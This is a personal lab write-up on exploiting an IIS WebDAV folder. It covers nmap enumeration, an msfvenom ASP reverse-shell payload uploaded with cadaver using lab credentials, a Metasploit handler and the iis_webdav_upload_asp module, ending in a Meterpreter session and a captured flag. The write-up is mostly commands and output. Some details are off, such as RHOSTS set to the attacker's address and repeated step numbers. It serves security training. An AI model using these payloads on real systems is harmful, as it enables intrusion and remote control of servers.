# Exploiting IIS with Metasploit (WebDAV)

### What is WebDAV
Web Distributed Authoring and Versioning (WebDAV) is an HTTP protocol extension that allows users to collaboratively edit and manage files stored on remote web servers.\
It’s like a file manager over HTTP
<br>
Target: [IIS](itr-a/eJPT-Learning/What_is/IIS)

### Tools and Modules
- **Metasploit**


- **msfvenom** \
It is a payload generation tool that comes with the Metasploit Framework.
It lets attacker create custom malicious files that, **when executed or opened by a target, connect back to the attacker** and give control.

- **cadaver**\
Cadaver is a command-line WebDAV client available in Kali Linux that allows users to interact with WebDAV-enabled servers. 

- **multi/handler**\
metasploit module that essentially used to set up a listener for the malicurous that you created
<br>
<br>

### Practice

1. Version detection and HTTP enumeration with Nmap
```bash
~# nmap -sV -p 80 --script=http-enum <target IP>

# Output
Nmap scan report for demo.ine.local (10.0.23.31)
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# What shoud I know from the output
# Target's IP address
# WebDAV is running on port 80 (Need username and password to log in)
```
```bash
# Open WebDAV directory on browser
 [To Parent Directory]

  1/4/2021  7:31 AM           49 AttackDefense.txt
  1/4/2021  7:25 AM          168 web.config
```

2. Create malcious file\
Command breakdown\
Generate `payload` for Windows opens a `reverse TCP Meterpreter shell`\
`LHOST` is my attack machine's reachable IP address\
Listening port is `port 1234`\
Save generated ASP into a file called `meterpreter.asp` -> Upload the file
```bash
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=1234 -f asp> meterpreter.asp

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38403 bytes
```
<br>
<br>

3. Manually exploit WebDAV
```bash
# Log in with username: bob password: password_123321
~# cadaver http://<target IP>/webdav
Authentication required for 10.0.23.31 on server `10.0.23.31':
Username: bob
Password: 
dav:/webdav/> 

# Try command and check the output is same as when opened target on browser
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        AttackDefense.txt                     49  Jan  4  2021
        web.config                           168  Jan  4  2021

# Upload generated file!
# The path's last file name needs to be the same name as I name to the payload file
dav:/webdav/> put /root/meterpreter.asp
Uploading /root/meterpreter.asp to `/webdav/meterpreter.asp':
Progress: [=============================>] 100.0% of 38403 bytes succeeded

# Reload browser and see the file is uploaded!
[To Parent Directory]

  1/4/2021  7:31 AM           49 AttackDefense.txt
 7/15/2025  1:30 PM        38403 meterpreter.asp     <- Here!
  1/4/2021  7:25 AM          168 web.config
```

4. Exploit
```bash
# start Metasploit

# Use multi/handler module
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 


# Set the payload I created with
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

# Output of "show options"
LHOST LPORT
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', se
                                        h, thread, process, none)
   LHOST     10.10.43.2       yes       The listen address (an interface
                                         may be specified)
   LPORT     1234             yes       The listen port


# run -> Waiting target to executed or loaded
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.43.2:1234 

# Click uploaded file on the browser
# Output on Terminal (below)
[*] Started reverse TCP handler on 10.10.43.2:1234 
[*] Sending stage (176198 bytes) to 10.0.23.31
[*] Meterpreter session 1 opened (10.10.43.2:1234 -> 10.0.23.31:49805) at 2025-07-15 19:08:53 +0530

# Try sysinfo command
meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 


# Successfully exploited!
```

3. Automate entire process with Metasploit module
```bash
# Search IIS upload module
msf6 exploit(multi/handler) > search iis upload

Matching Modules
================

   #  Name                                                             Disclosure Date  Rank       Check  Description
   -  ----                                                             ---------------  ----       -----  -----------
   0  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload                                        
   1  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   2  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution


msf6 exploit(multi/handler) > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

# Don't have to set payload because windows/meterpreter/reverse_tcp is defaulted
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS 10.10.43.2
RHOSTS => 10.10.43.2
# PATH = the last part should be file name I'll upload (just like the meterpreter.asp)
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/metasploit.asp
PATH => /webdav/metasploit.asp

# Run the module
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.43.2:4444 
[*] Checking /webdav/metasploit.asp
[*] Uploading 613817 bytes to /webdav/metasploit.txt...
[*] Moving /webdav/metasploit.txt to /webdav/metasploit.asp...
[*] Executing /webdav/metasploit.asp...
[*] Deleting /webdav/metasploit.asp (this doesn't always work)...
[*] Sending stage (176198 bytes) to 10.0.23.31
[*] Meterpreter session 2 opened (10.10.43.2:4444 -> 10.0.23.31:49834) at 2025-07-15 19:20:12 +0530
meterpreter >

# Try sysinfo command
meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

# Successfully exploited!
```

4. Find the flag
```bash
# cd .. tp C:\
meterpreter > cd ..
meterpreter > ls
Listing: c:\
============

Mode          Size    Type  Last modified          Name
----          ----    ----  -------------          ----
040777/rwxrw  0       dir   2020-10-27 10:40:39 +  $Recycle.Bin
xrwx                        0530
100666/rw-rw  1       fil   2018-09-15 12:42:30 +  BOOTNXT
-rw-                        0530
040777/rwxrw  8192    dir   2020-09-09 10:08:52 +  Boot
xrwx                        0530
040777/rwxrw  0       dir   2020-12-05 12:58:57 +  Config.Msi
xrwx                        0530
040777/rwxrw  0       dir   2018-11-14 21:40:15 +  Documents and Setting
xrwx                        0530                   s
040777/rwxrw  0       dir   2018-11-14 12:26:18 +  EFI
xrwx                        0530
040777/rwxrw  0       dir   2020-05-13 23:28:09 +  PerfLogs
xrwx                        0530
040555/r-xr-  8192    dir   2020-10-27 19:48:59 +  Program Files
xr-x                        0530
040777/rwxrw  8192    dir   2021-01-04 12:57:40 +  Program Files (x86)
xrwx                        0530
040777/rwxrw  4096    dir   2020-10-27 13:17:34 +  ProgramData
xrwx                        0530
040777/rwxrw  0       dir   2020-10-27 02:32:48 +  Recovery
xrwx                        0530
040777/rwxrw  4096    dir   2020-10-27 10:43:44 +  System Volume Informa
xrwx                        0530                   tion
040555/r-xr-  4096    dir   2020-10-27 19:51:27 +  Users
xr-x                        0530
040777/rwxrw  16384   dir   2020-10-27 12:16:16 +  Windows
xrwx                        0530
100444/r--r-  408692  fil   2020-09-09 10:03:42 +  bootmgr
-r--                        0530
100666/rw-rw  32      fil   2021-01-04 12:52:44 +  flag.txt     <- Here!
-rw-                        0530
040777/rwxrw  0       dir   2020-10-27 12:15:52 +  inetpub
xrwx                        0530
000000/-----  0       fif   1970-01-01 05:30:00 +  pagefile.sys
----                        0530

meterpreter > cat flag.txt
d3aff16a801b4b7d36b4da1094bee345
```
